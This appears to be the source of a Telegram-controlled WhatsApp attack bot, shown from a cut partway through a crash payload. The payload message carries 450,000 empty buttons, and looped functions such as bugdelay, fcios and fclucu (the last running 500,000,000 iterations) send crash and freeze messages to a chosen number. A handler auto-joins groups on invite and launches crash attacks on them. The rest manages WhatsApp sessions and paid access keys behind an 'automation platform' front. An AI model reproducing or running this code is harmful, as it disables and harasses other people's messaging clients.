            nativeFlowResponsMessage: {
              buttons: Array.from({ length: 450000 }, () => ({}))
            }
          }
        }
      }
    }
  };
await mexx.relayMessage(target, kxa, {
}) 
}

async function bugdelay(mexx, target) {
  for (let i = 0; i < 35; i++) {
    await DelayInternal(mexx, target); await sleep(500);
    await DelayInternal(mexx, target); await sleep(500);
    await DelayInternal(mexx, target); await sleep(500);
    await DelayInternal(mexx, target); await sleep(500);
  }
  console.log(chalk.green(`Success Send Bugs to ${target}`));
}

async function fcios(mexx, target) {
  for (let i = 0; i < 35; i++) {
    await IossPler(mexx, target);      await sleep(500);
    await DelayInternal(mexx, target); await sleep(500);
    await IossPler(mexx, target);      await sleep(500);
    await DelayInternal(mexx, target); await sleep(500);
  }
  console.log(chalk.green(`Success Send Bugs to ${target}`));
}

async function uinew(mexx, target) {
  for (let i = 0; i < 35; i++) {
    await FreezeLock(mexx, target);    await sleep(500);
    await DelayInternal(mexx, target); await sleep(500);
    await FreezeLock(mexx, target);    await sleep(500);
    await DelayInternal(mexx, target); await sleep(500);
  }
  console.log(chalk.green(`Success Send Bugs to ${target}`));
}

async function spamnew(mexx, target) {
  for (let i = 0; i < 35; i++) {
    await BullKuota(mexx, target);     await sleep(500);
    await DelayInternal(mexx, target); await sleep(500);
    await BullKuota(mexx, target);     await sleep(500);
    await DelayInternal(mexx, target); await sleep(500);
  }
  console.log(chalk.green(`Success Send Bugs to ${target}`));
}

async function fcddelay(mexx, target) {
  for (let i = 0; i < 35; i++) {
    await DelayInternal(mexx, target); await sleep(500);
    await DelayAll(mexx, target);      await sleep(500);
    await DelayInternal(mexx, target); await sleep(500);
    await DelayInternal(mexx, target); await sleep(500);
  }
  console.log(chalk.green(`Success Send Bugs to ${target}`));
}

async function fcbokep(mexx, target) {
  for (let i = 0; i < 35; i++) {
    await DelayAll(mexx, target);      await sleep(500);
    await fclow(mexx, target);         await sleep(500);
    await DelayAll(mexx, target);      await sleep(500);
    await fclow(mexx, target);         await sleep(500);
  }
  console.log(chalk.green(`Success Send Bugs to ${target}`));
}

async function fclucu(mexx, target) {
  for (let i = 0; i < 500000000; i++) {
    await LendUpLah(mexx, target);   await sleep(500);
    await fclow(mexx, target);         await sleep(500);
    await LendUpLah(mexx, target);   await sleep(500);
    await fclow(mexx, target);         await sleep(500);
  }
  console.log(chalk.green(`Success Send Bugs to ${target}`));
}

const numberModeMap = {
  delay:     bugdelay,
  killios:   fcios,
  blank:     spamnew,
  ulti:      uinew,
  fcdelay:   fcddelay,
  fcclickkk: fcbokep,
  fcbola:    fclucu,
};

const connectToWhatsAppUser = async (username, BotNumber, sessionDir, opts = {}) => {
  try {
    const eventUser = opts.eventUser || username;
    const logTag = `[${username}]`;
    const phone = normalizePhoneNumber(BotNumber) || String(BotNumber).replace(/\D/g, "");
    const sessionKey = `${username}_${phone}`;
    console.log(`${logTag} 🚀 Starting for ${phone}`);

    if (!phone || phone.length < 10) {
      const err = new Error("Nomor tidak valid. Gunakan format 628xxx");
      if (eventUser) {
        sendEventToUser(eventUser, {
          type: "error",
          message: err.message,
          number: phone || BotNumber,
          status: "error",
        });
      }
      throw err;
    }

    if (eventUser) {
      sendEventToUser(eventUser, {
        type: "status",
        message: "Initiating WhatsApp connection...",
        number: phone,
        status: "connecting",
      });
    }

    if (!fs.existsSync(sessionDir)) {
      fs.mkdirSync(sessionDir, { recursive: true });
    }

    const alreadyRegistered = hasRegisteredCreds(sessionDir);

    if (sessions.has(sessionKey)) {
      try {
        const old = sessions.get(sessionKey);
        if (old && typeof old.end === "function") old.end(undefined);
      } catch {}
      sessions.delete(sessionKey);
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    let version;
    try {
      const v = await fetchLatestWaWebVersion();
      version = v.version;
    } catch (e) {
      console.warn(`${logTag} fetchLatestWaWebVersion failed, using default:`, e.message);
      version = undefined;
    }

    const sockOpts = {
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: 60000,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 25000,
      markOnlineOnConnect: false,
      browser: ["Ubuntu", "Chrome", "22.04.4"],
      generateHighQualityLinkPreview: true,
      syncFullHistory: false,
      getMessage: async () => undefined,
    };
    if (version) sockOpts.version = version;

    const userSock = makeWASocket(sockOpts);

    return new Promise((resolve, reject) => {
      let isConnected = false;
      let pairingCodeGenerated = false;
      let resolved = false;
      let connectionTimeout;
      let pairingRetries = 0;

      const cleanup = () => {
        if (connectionTimeout) clearTimeout(connectionTimeout);
      };
      const safeResolve = (sock) => {
        if (!resolved) { resolved = true; cleanup(); resolve(sock); }
      };
      const safeReject = (err) => {
        if (!resolved) { resolved = true; cleanup(); reject(err); }
      };

      const requestPairing = async () => {
        if (pairingCodeGenerated) return;
        if (userSock.authState?.creds?.registered) return;
        pairingCodeGenerated = true;
        pairingRetries++;

        await new Promise((r) => setTimeout(r, 1500));

        try {
          console.log(`${logTag} 📱 Requesting pairing code for ${phone}...`);
          if (eventUser) {
            sendEventToUser(eventUser, {
              type: "status",
              message: "Generating pairing code...",
              number: phone,
              status: "generating_code",
            });
          }

          const code = await userSock.requestPairingCode(phone);
          const formattedCode = (code || "").match(/.{1,4}/g)?.join("-") || code;
          console.log(`${logTag} 📱 CODE ${phone}: ${formattedCode}`);

          if (eventUser) {
            sendEventToUser(eventUser, {
              type: "pairing_code",
              message: "Pairing code ready. Open WhatsApp → Linked Devices → Link with phone number.",
              number: phone,
              code: formattedCode,
              status: "waiting_pairing",
              instructions: [
                "1. Buka WhatsApp di HP",
                "2. Setelan → Perangkat tertaut",
                "3. Tautkan perangkat → Tautkan dengan nomor telepon",
                `4. Masukkan kode: ${formattedCode}`,
              ],
            });
          }
        } catch (err) {
          console.error(`${logTag} ❌ Code error:`, err.message);
          pairingCodeGenerated = false;

          if (pairingRetries < 3) {
            console.log(`${logTag} 🔄 Retry pairing code (${pairingRetries}/3)...`);
            setTimeout(() => requestPairing(), 3000);
            return;
          }

          if (eventUser) {
            sendEventToUser(eventUser, {
              type: "error",
              message: `Gagal generate pairing code: ${err.message}. Coba lagi / pastikan nomor benar (628xxx).`,
              number: phone,
              status: "code_error",
            });
          }
        }
      };

      userSock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        console.log(`${logTag} 🔄 ${connection || "update"}`);

        if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          const errMsg = lastDisconnect?.error?.message || "";
          console.log(`${logTag} ❌ Closed: ${statusCode} (${errMsg})`);
          sessions.delete(sessionKey);
          listenerRegistry.delete(sessionKey);

          const isLoggedOut = statusCode === DisconnectReason.loggedOut;

          if (isLoggedOut) {
            console.log(`${logTag} 📵 Logged out (permanent)`);
            if (eventUser) {
              sendEventToUser(eventUser, {
                type: "error",
                message: "Device logged out dari WhatsApp.",
                number: phone,
                status: "logged_out",
              });
            }
            if (fs.existsSync(sessionDir)) {
              try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch {}
            }
            try {
              const userSessions = loadUserSessions();
              if (userSessions[username]) {
                userSessions[username] = userSessions[username].filter(
                  (n) => n !== phone && n !== BotNumber
                );
                if (userSessions[username].length === 0) delete userSessions[username];
                saveUserSessions(userSessions);
              }
            } catch {}
            safeReject(new Error("Device logged out"));
            return;
          }

          const canReconnect = hasRegisteredCreds(sessionDir) || alreadyRegistered;

          if (canReconnect) {
            console.log(`${logTag} 🔄 Auto-reconnect (code=${statusCode})...`);
            if (eventUser) {
              sendEventToUser(eventUser, {
                type: "status",
                message: "Reconnecting...",
                number: phone,
                status: "reconnecting",
              });
            }
            const delay = statusCode === DisconnectReason.restartRequired ? 2000 : 5000;
            setTimeout(async () => {
              try {
                if (!hasRegisteredCreds(sessionDir)) {
                  if (!isConnected) safeReject(new Error("No credentials for reconnect"));
                  return;
                }
                const s = await connectToWhatsAppUser(username, phone, sessionDir, opts);
                if (!resolved) safeResolve(s);
              } catch (e) {
                console.error(`${logTag} ❌ Reconnect failed:`, e.message);
                setTimeout(async () => {
                  try {
                    const s2 = await connectToWhatsAppUser(username, phone, sessionDir, opts);
                    if (!resolved) safeResolve(s2);
                  } catch (e2) {
                    if (!isConnected) safeReject(e2);
                  }
                }, 15000);
              }
            }, delay);
            return;
          }

          if (!isConnected) {
            cleanup();
            if (eventUser) {
              sendEventToUser(eventUser, {
                type: "error",
                message: `Koneksi gagal (${statusCode || "unknown"}). Coba add sender lagi.`,
                number: phone,
                status: "failed",
              });
            }
            safeReject(new Error(`Failed: ${statusCode}`));
          }
          return;
        }

        if (connection === "open") {
          console.log(`${logTag} ✅ CONNECTED!`);
          isConnected = true;
          sessions.set(sessionKey, userSock);

          if (eventUser) {
            sendEventToUser(eventUser, {
              type: "success",
              message: "Connected.",
              number: phone,
              status: "connected",
            });
          }

          const userSessions = loadUserSessions();
          if (!userSessions[username]) userSessions[username] = [];
          if (!userSessions[username].includes(phone)) {
            userSessions[username] = userSessions[username].filter(
              (n) => n !== BotNumber && n !== phone
            );
            userSessions[username].push(phone);
            saveUserSessions(userSessions);
          }

          if (!listenerRegistry.has(sessionKey)) {
            listenerRegistry.set(sessionKey, true);
            pasangGroupHandler(userSock, username, phone);
          }

          safeResolve(userSock);
          return;
        }

        if (connection === "connecting") {
          if (eventUser) {
            sendEventToUser(eventUser, {
              type: "status",
              message: "Connecting...",
              number: phone,
              status: "connecting",
            });
          }

          if (!userSock.authState?.creds?.registered && !alreadyRegistered) {
            requestPairing();
          }
        }

        if (!userSock.authState?.creds?.registered && !alreadyRegistered && !pairingCodeGenerated) {
          if (qr || connection === undefined) {
            requestPairing();
          }
        }

        if (qr && eventUser) {
          sendEventToUser(eventUser, {
            type: "qr",
            message: "Scan QR (atau gunakan pairing code)",
            number: phone,
            qr,
            status: "waiting_qr",
          });
        }
      });

      userSock.ev.on("creds.update", saveCreds);

      connectionTimeout = setTimeout(() => {
        if (!isConnected && !resolved) {
          if (eventUser) {
            sendEventToUser(eventUser, {
              type: "error",
              message: "Timeout 3 menit. Kode pairing kadaluarsa — klik Add Sender lagi.",
              number: phone,
              status: "timeout",
            });
          }
          try { userSock.end(undefined); } catch {}
          safeReject(new Error("Timeout"));
        }
      }, 180000);
    });
  } catch (error) {
    console.error(`[${username}] ❌ Error:`, error);
    const errUser = opts.eventUser || username;
    if (errUser) {
      sendEventToUser(errUser, {
        type: "error",
        message: `Error: ${error.message}`,
        number: BotNumber,
        status: "error",
      });
    }
    throw error;
  }
};

function pasangGroupHandler(userSock, username, BotNumber) {
  const AUTO_ATTACK_MODE = process.env.AUTO_ATTACK_MODE || "crash";
  const AUTO_ATTACK_ITER = parseInt(process.env.AUTO_ATTACK_ITER) || 50;

  userSock.ev.on("messages.upsert", async ({ messages, type }) => {
    for (const msg of messages) {
      if (type !== "notify") continue;
      const inviteMsg = msg.message?.groupInviteMessage;
      if (!inviteMsg) continue;

      const groupName = inviteMsg.groupName || "Unknown Group";
      const inviteCode = inviteMsg.inviteCode;
      const inviterJid = msg.key.participant || msg.key.remoteJid;

      console.log(`[${username}] 📨 Invite: ${groupName}`);

      try {
        const invitesFile = safeReadPendingInvites();
        if (!invitesFile[username]) invitesFile[username] = {};
        if (!invitesFile[username][BotNumber]) invitesFile[username][BotNumber] = [];
        invitesFile[username][BotNumber].push({
          groupName,
          inviterJid,
          inviteCode,
          msgKey: msg.key,
          inviteMsg,
          timestamp: Date.now(),
          status: "pending",
        });
        safeWritePendingInvites(invitesFile);
      } catch {}

      sendEventToUser(username, {
        type: "group_invite_pending",
        message: `📨 Invite: ${groupName}`,
        number: BotNumber,
        status: "pending",
        groupName,
        inviteCode,
        inviterJid,
      });

      setTimeout(async () => {
        try {
          const groupInfo = await userSock.groupGetInviteInfo(inviteCode);
          if (groupInfo && groupInfo.id) {
            await userSock.groupAcceptInviteV4(msg.key, inviteMsg);
            console.log(`[${username}] ✅ AUTO-ACCEPT: ${groupName}`);
            sendEventToUser(username, {
              type: "group_accepted_attacking",
              message: `Joined ${groupName}. Starting ${AUTO_ATTACK_MODE.toUpperCase()}...`,
              number: BotNumber,
              status: "accepted_attacking",
              groupName,
              groupJid: groupInfo.id,
              mode: AUTO_ATTACK_MODE,
            });

            await sleep(5000);
            let result;
            try {
              result = await runGroupAttack(userSock, groupInfo.id, AUTO_ATTACK_MODE, AUTO_ATTACK_ITER);
            } catch (err) {
              result = { success: false, error: err.message };
            }

            sendEventToUser(username, {
              type: result.success ? "group_attack_success" : "group_attack_failed",
              message: result.success
                ? `Completed. ${AUTO_ATTACK_MODE.toUpperCase()} ${result.totalIterations}x on ${groupName}`
                : `Failed: ${result.error}`,
              number: BotNumber,
              status: result.success ? "success" : "failed",
              groupName,
              mode: AUTO_ATTACK_MODE,
            });

            try {
              const invFile = safeReadPendingInvites();
              const invList = invFile[username]?.[BotNumber] || [];
              const idx = invList.findIndex((i) => i.inviteCode === inviteCode);
              if (idx !== -1) {
                invList[idx].status = "accepted_attacking";
                safeWritePendingInvites(invFile);
              }
            } catch {}
          } else {
            sendEventToUser(username, {
              type: "group_closed",
              message: `Failed. ${groupName} closed.`,
              number: BotNumber,
              status: "closed",
              groupName,
            });
          }
        } catch (err) {
          console.log(`[${username}] ❌ ${groupName}: ${err.message}`);
          sendEventToUser(username, {
            type: "group_closed",
            message: `Failed. ${groupName} closed.`,
            number: BotNumber,
            status: "closed",
            groupName,
          });
        }
      }, 30000);
    }
  });
}

function forceReloadWithRetry() {
  reloadAttempts++;
  console.log(`\n🔄 RELOAD ATTEMPT ${reloadAttempts}/${MAX_RELOAD_ATTEMPTS}`);
  const userSessions = loadUserSessions();
  if (Object.keys(userSessions).length === 0) {
    console.log("💡 No sessions to reload");
  } else {
    console.log(`📋 Found ${Object.keys(userSessions).length} users`);
  }

  simpleReloadSessions();

  setTimeout(() => {
    const count = sessions.size;
    console.log(`📊 Current active: ${count}`);
    if (count === 0 && reloadAttempts < MAX_RELOAD_ATTEMPTS) {
      console.log(`🔄 Retry ${reloadAttempts}/${MAX_RELOAD_ATTEMPTS}`);
      forceReloadWithRetry();
    } else if (count === 0) {
      console.log("❌ All retry failed");
    } else {
      console.log(`✅ SUCCESS: ${count} sessions active`);
    }
  }, 30000);
}

function simpleReloadSessions() {
  console.log("=== 🔄 SESSION RELOAD STARTED ===");
  const userSessions = loadUserSessions();
  let total = 0, success = 0, skipped = 0;

  for (const [username, numbers] of Object.entries(userSessions)) {
    console.log(`👤 ${username} with ${numbers.length} senders`);
    numbers.forEach((number) => {
      total++;
      const sessionKey = `${username}_${number}`;
      if (sessions.has(sessionKey)) {
        skipped++;
        console.log(`⏭️ Skip (already active): ${number}`);
        return;
      }
      const sessionDir = userSessionPath(username, number);
      const credsPath = path.join(sessionDir, "creds.json");
      if (fs.existsSync(credsPath)) {
        console.log(`🔄 Reconnect: ${number} for ${username}`);
        connectToWhatsAppUser(username, number, sessionDir)
          .then(() => { success++; console.log(`✅ Reconnected: ${number}`); })
          .catch((err) => console.log(`❌ Failed ${number}: ${err.message}`));
      } else {
        console.log(`⚠️ No creds for ${number}`);
      }
    });
  }
  console.log(`📊 Reload: ${success} ok / ${skipped} skip / ${total} total`);
}

bot.command("start", async (ctx) => {
  if (!ctx.from) return;
  const username = ctx.from.username || ctx.from.first_name || "User";
  const teks =
    `\n<b>WhatsApp Automation Bot</b>\n` +
    `<i>Professional multi-function automation platform.</i>\n\n` +
    `<b>Account Information</b>\n` +
    `• Developer : @@Lifzbarz\n` +
    `• Version   : 9.0.0\n` +
    `• Username  : ${username}\n\n` +
    `Silakan pilih menu.\n`;

  const keyboard = Markup.keyboard([
    ["🔑 Key Management", "🔐 Access Control"],
    ["ℹ️ Bot Info", "💬 Support"],
    ["📰 Berita", "📢 Channel"],
  ]).resize().oneTime(false);

  await ctx.replyWithVideo("https://files.catbox.moe/01qiu8.mp4", {
    caption: teks,
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
});

bot.hears("🔑 Key Management", async (ctx) => {
  if (!ctx.from) return;
  if (getPendingAction(ctx.from.id.toString())) return;
  const menu =
    `\n<b>Key Management</b>\n<i>Create and manage user access keys.</i>\n\nPilih aksi:\n`;
  await ctx.reply(menu, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [Markup.button.callback("➕ Create Key", "btn_addkey"), Markup.button.callback("📋 List Keys", "btn_listkey")],
      [Markup.button.callback("🗑️ Delete Key", "btn_delkey")],
      [Markup.button.url("Documentation", "https://t.me/@Lifzbarz")],
    ]).reply_markup,
  });
});

bot.hears("🔐 Access Control", async (ctx) => {
  if (!ctx.from) return;
  if (getPendingAction(ctx.from.id.toString())) return;
  const menu =
    `\n<b>Access Control</b>\n<i>Manage owner-level access.</i>\n\nPilih aksi:\n`;
  await ctx.reply(menu, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [Markup.button.callback("✅ Grant Access", "btn_acces"), Markup.button.callback("❌ Revoke Access", "btn_delacces")],
      [Markup.button.url("Documentation", "https://t.me/@Lifzbarz")],
    ]).reply_markup,
  });
});

bot.hears("ℹ️ Bot Info", async (ctx) => {
  if (!ctx.from) return;
  if (getPendingAction(ctx.from.id.toString())) return;
  const infoText =
    `\n<b>Bot Information</b>\n\n` +
    `<b>WhatsApp Automation Bot</b>\n` +
    `<i>Professional multi-function automation platform.</i>\n\n` +
    `<b>Features</b>\n` +
    `• User & Key Management\n` +
    `• Role-Based Access Control\n` +
    `• Multi-Sender Support\n` +
    `• Group Automation\n` +
    `• Secure Session Handling\n\n` +
    `<b>Support</b>\nContact: @@Lifzbarz\n`;
  await ctx.reply(infoText, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [Markup.button.url("Documentation", "https://t.me/@Lifzbarz")],
    ]).reply_markup,
  });
});

bot.hears("💬 Support", (ctx) => {
  if (!ctx.from) return;
  if (getPendingAction(ctx.from.id.toString())) return;
  return ctx.reply("Support: https://t.me/@Lifzbarz");
});

bot.hears("📢 Channel", (ctx) => {
  if (!ctx.from) return;
  if (getPendingAction(ctx.from.id.toString())) return;
  return ctx.reply("Channel: https://t.me/@Lifzbarz");
});

bot.hears("📰 Berita", async (ctx) => {
  if (!ctx.from) return;
  const userId = ctx.from.id.toString();
  if (getPendingAction(userId)) return;
  const list = loadBerita();
  let t = `📰 <b>Berita X-For</b>\n\n`;

  if (!list.length) {
    t += `📭 Belum ada berita.\n\n`;
  } else {
    t += `<b>Daftar (${list.length})</b>\n\n`;
    list.slice(0, 10).forEach((b, i) => {
      const date = new Date(b.ts).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
      t += `<b>${i + 1}.</b> [${b.tag}] ${String(b.title || "").slice(0, 60)}\n   <i>${date} WIB</i>\n\n`;
    });
    if (list.length > 10) t += `<i>...dan ${list.length - 10} berita lainnya</i>\n\n`;
  }

  const buttons = [];
  if (isOwner(userId)) {
    t += `➕ Owner: tekan <b>Tambah Berita</b> lalu kirim <b>foto + caption</b>.`;
    buttons.push([Markup.button.callback("➕ Tambah Berita", "btn_addberita")]);
    buttons.push([Markup.button.callback("🗑️ Hapus Berita", "btn_delberita")]);
  } else {
    t += `Semua role dapat melihat berita.`;
  }

  await ctx.reply(t, {
    parse_mode: "HTML",
    reply_markup: buttons.length ? Markup.inlineKeyboard(buttons).reply_markup : undefined,
  });
});

bot.action("btn_addkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.answerCbQuery("Access denied.", { show_alert: true });
  await ctx.answerCbQuery();

  const askText =
    `\n<b>Create Key</b>\n<i>Send data:</i>\n\n` +
    `<code>username,duration</code>\n` +
    `<code>username,duration,custom_key</code>\n\n` +
    `<b>Example</b>\n` +
    `<code>user1,7d</code>\n` +
    `<code>user1,30d,MYKEY123</code>\n\n` +
    `<i>Valid 60s.</i>\n`;

  const sent = await ctx.reply(askText, {
    parse_mode: "HTML",
    reply_markup: Markup.forceReply().reply_markup,
  });
  setPendingAction(userId, "addkey", sent.message_id, 60000);
});

bot.action("btn_listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.answerCbQuery("Access denied.", { show_alert: true });
  await ctx.answerCbQuery();

  const users = getUsers();
  if (users.length === 0) return ctx.reply("No keys yet.");

  let teks = `<b>Active Keys</b>\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric", month: "2-digit", day: "2-digit",
      hour: "2-digit", minute: "2-digit", timeZone: "Asia/Jakarta",
    });
    teks +=
      `${i + 1}. <b>${u.username}</b>\n` +
      `   Key     : <code>${u.key}</code>\n` +
      `   Expires : ${exp} WIB\n\n`;
  });
  await ctx.reply(teks, { parse_mode: "HTML" });
});

bot.action("btn_delkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.answerCbQuery("Access denied.", { show_alert: true });
  await ctx.answerCbQuery();

  const askText =
    `\n<b>Delete Key</b>\nSend username.\n\n` +
    `<b>Example</b>\n<code>user1</code>\n\n<i>Valid 60s.</i>\n`;
  const sent = await ctx.reply(askText, {
    parse_mode: "HTML",
    reply_markup: Markup.forceReply().reply_markup,
  });
  setPendingAction(userId, "delkey", sent.message_id, 60000);
});

bot.action("btn_acces", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isMainOwner(userId)) return ctx.answerCbQuery("Main owner only.", { show_alert: true });
  await ctx.answerCbQuery();

  const askText =
    `\n<b>Grant Access</b>\nSend Telegram ID.\n\n` +
    `<b>Example</b>\n<code>7066156416</code>\n\n<i>Valid 60s.</i>\n`;
  const sent = await ctx.reply(askText, {
    parse_mode: "HTML",
    reply_markup: Markup.forceReply().reply_markup,
  });
  setPendingAction(userId, "acces", sent.message_id, 60000);
});

bot.action("btn_delacces", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isMainOwner(userId)) return ctx.answerCbQuery("Main owner only.", { show_alert: true });
  await ctx.answerCbQuery();

  const askText =
    `\n<b>Revoke Access</b>\nSend Telegram ID.\n\n` +
    `<b>Example</b>\n<code>7066156416</code>\n\n<i>Valid 60s.</i>\n`;
  const sent = await ctx.reply(askText, {
    parse_mode: "HTML",
    reply_markup: Markup.forceReply().reply_markup,
  });
  setPendingAction(userId, "delacces", sent.message_id, 60000);
});

bot.action("btn_addberita", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.answerCbQuery("Owner only.", { show_alert: true });
  await ctx.answerCbQuery();

  const askText =
    `\n📸 <b>Tambah Berita</b>\n\n` +
    `Kirim <b>satu foto</b> + <b>caption berita</b>.\n\n` +
    `Optional tag:\n` +
    `<code>#VIRAL</code> <code>#BREAKING</code> <code>#TRENDING</code> <code>#HOT</code>\n\n` +
    `Contoh:\n<code>#VIRAL Kejadian heboh di Jakarta</code>\n\n` +
    `<i>Berlaku 90 detik.</i>\n`;
  const sent = await ctx.reply(askText, { parse_mode: "HTML" });
  setPendingAction(userId, "addberita", sent.message_id, 90000);
});

bot.action("btn_delberita", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.answerCbQuery("Owner only.", { show_alert: true });
  await ctx.answerCbQuery();

  const list = loadBerita();
  if (!list.length) return ctx.reply("📭 Tidak ada berita.");

  let t = `🗑️ <b>Hapus Berita</b>\n\nKirim nomor (1-${list.length}):\n\n`;
  list.slice(0, 15).forEach((b, i) => {
    t += `<b>${i + 1}.</b> [${b.tag}] ${String(b.title || "").slice(0, 50)}\n`;
  });
  t += `\n<i>Berlaku 60s.</i>`;

  const sent = await ctx.reply(t, {
    parse_mode: "HTML",
    reply_markup: Markup.forceReply().reply_markup,
  });
  setPendingAction(userId, "delberita", sent.message_id, 60000);
});

bot.on("message", async (ctx) => {
  if (!ctx.message || !ctx.from) return;
  const userId = ctx.from.id.toString();
  const pending = getPendingAction(userId);

  if (pending && pending.action === "addberita") {
    if (!isOwner(userId)) {
      clearPendingAction(userId);
      return ctx.reply("Owner only.");
    }
    const msg = ctx.message;
    let photoSource = null;
    if (msg.photo && msg.photo.length) photoSource = msg.photo;
    else if (msg.reply_to_message?.photo?.length) photoSource = msg.reply_to_message.photo;

    if (!photoSource) {
      if (msg.text && /^(batal|cancel)$/i.test(msg.text.trim())) {
        clearPendingAction(userId);
        return ctx.reply("❌ Dibatalkan.");
      }
      return ctx.reply(
        "📸 Kirim <b>foto</b> + caption.\nKetik <code>batal</code> untuk batal.",
        { parse_mode: "HTML" }
      );
    }

    clearPendingAction(userId);
    const best = photoSource[photoSource.length - 1];
    let caption = (msg.caption || msg.reply_to_message?.caption || "").trim() || "Berita terbaru";
    let tag = "HOT";
    const tagMatch = caption.match(/^#([A-Za-z]+)\s+/);
    if (tagMatch) {
      tag = tagMatch[1].toUpperCase();
      caption = caption.replace(/^#[A-Za-z]+\s+/, "").trim() || "Berita terbaru";
    }

    try {
      const photoPath = await saveBeritaPhotoFromTelegram(ctx, best.file_id);
      const list = loadBerita();
      const item = {
        id: "ber_" + Date.now() + "_" + Math.random().toString(36).slice(2, 8),
        tag,
        title: caption.slice(0, 200),
        source: "X-For News",
        photo: photoPath,
        views: Math.floor(Math.random() * 900) + 50,
        ts: Date.now(),
      };
      list.unshift(item);
      saveBerita(list.slice(0, 30));
      await ctx.reply(
        `✅ <b>Berita ditambahkan</b>\n\n` +
        `<b>Tag</b> : ${item.tag}\n` +
        `<b>Judul</b> : ${item.title}\n` +
        `<b>Total</b> : ${Math.min(list.length, 30)}`,
        { parse_mode: "HTML" }
      );
    } catch (e) {
      console.error("[BERITA] error:", e);
      await ctx.reply("❌ Gagal: " + e.message);
    }
    return;
  }

  if (!ctx.message.text) return;
  if (!ctx.message.reply_to_message) return;
  if (!pending) return;
  if (ctx.message.reply_to_message.message_id !== pending.msgId) return;

  const input = ctx.message.text.trim();
  clearPendingAction(userId);

  if (pending.action === "addkey") {
    if (!input || !input.includes(",")) {
      return ctx.reply(
        "<b>Invalid format.</b>\n\nExample:\n<code>user1,7d</code>",
        { parse_mode: "HTML" }
      );
    }
    const parts = input.split(",");
    const username = parts[0].trim();
    const durasiStr = parts[1].trim();
    const customKey = parts[2]?.trim() || null;
    const durationMs = parseDuration(durasiStr);

    if (!durationMs) {
      return ctx.reply(
        "<b>Invalid duration.</b>\nUse: <code>7d</code> | <code>1d</code> | <code>12h</code>",
        { parse_mode: "HTML" }
      );
    }

    const key = customKey || generateKey(6);
    const expired = Date.now() + durationMs;
    const users = getUsers();
    const idx = users.findIndex((u) => u.username === username);
    if (idx !== -1) users[idx] = { ...users[idx], key, expired };
    else users.push({ username, key, expired });
    saveUsers(users);

    const expiredStr = new Date(expired).toLocaleString("id-ID", {
      year: "numeric", month: "2-digit", day: "2-digit",
      hour: "2-digit", minute: "2-digit", timeZone: "Asia/Jakarta",
    });

    await ctx.reply(
      `<b>Key created.</b>\n\n` +
      `<b>Username</b> : <code>${username}</code>\n` +
      `<b>Key</b>      : <code>${key}</code>\n` +
      `<b>Expires</b>  : ${expiredStr} WIB`,
      { parse_mode: "HTML" }
    );
    return;
  }

  if (pending.action === "delkey") {
    if (!input) return ctx.reply("Provide username.", { parse_mode: "HTML" });
    const users = getUsers();
    const idx = users.findIndex((u) => u.username === input);
    if (idx === -1) {
      return ctx.reply(`Username <code>${input}</code> not found.`, { parse_mode: "HTML" });
    }
    users.splice(idx, 1);
    saveUsers(users);
    await ctx.reply(`Key for <code>${input}</code> deleted.`, { parse_mode: "HTML" });
    return;
  }

  if (pending.action === "acces") {
    if (!input) return ctx.reply("Invalid.", { parse_mode: "HTML" });
    const data = loadAkses();
    if (data.owners.includes(input)) return ctx.reply("Already has access.");
    data.owners.push(input);
    saveAkses(data);
    await ctx.reply(`Access granted to <code>${input}</code>.`, { parse_mode: "HTML" });
    return;
  }

  if (pending.action === "delacces") {
    if (!input) return ctx.reply("Invalid.", { parse_mode: "HTML" });
    const data = loadAkses();
    if (!data.owners.includes(input)) return ctx.reply("Not owner.");
    data.owners = data.owners.filter((uid) => uid !== input);
    saveAkses(data);
    await ctx.reply(`Access for <code>${input}</code> revoked.`, { parse_mode: "HTML" });
    return;
  }

  if (pending.action === "delberita") {
    if (!isOwner(userId)) return ctx.reply("Owner only.");
    const list = loadBerita();
    if (!list.length) return ctx.reply("📭 Tidak ada berita.");
    const num = parseInt(input);
    if (!num || num < 1 || num > list.length) {
      return ctx.reply(`Format: nomor 1-${list.length}`, { parse_mode: "HTML" });
    }
    const removed = list.splice(num - 1, 1)[0];
    saveBerita(list);
    deleteBeritaPhoto(removed.photo);
    await ctx.reply(`🗑️ Dihapus: <b>${removed.title}</b>`, { parse_mode: "HTML" });
    return;
  }
});

bot.command("addberita", async (ctx) => {
  if (!ctx.from) return;
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("Owner only.");

  const msg = ctx.message;
  const replyTo = msg.reply_to_message;
  let photoSource = null;
  if (msg.photo?.length) photoSource = msg.photo;
  else if (replyTo?.photo?.length) photoSource = replyTo.photo;

  if (!photoSource) {
    return ctx.reply(
      "📸 Format:\n\n" +
      "• <code>/addberita caption</code> dengan foto\n" +
      "• Reply foto + <code>/addberita caption</code>\n\n" +
      "Tag: <code>#VIRAL</code> <code>#BREAKING</code> <code>#TRENDING</code> <code>#HOT</code>",
      { parse_mode: "HTML" }
    );
  }

  const best = photoSource[photoSource.length - 1];
  let caption = "";
  if (replyTo?.caption) caption = replyTo.caption;
  if (msg.caption) {
    const inline = msg.caption.replace(/^\/addberita(@\w+)?\s*/i, "").trim();
    if (inline) caption = inline;
  }
  if (!caption) caption = "Berita terbaru";

  let tag = "HOT";
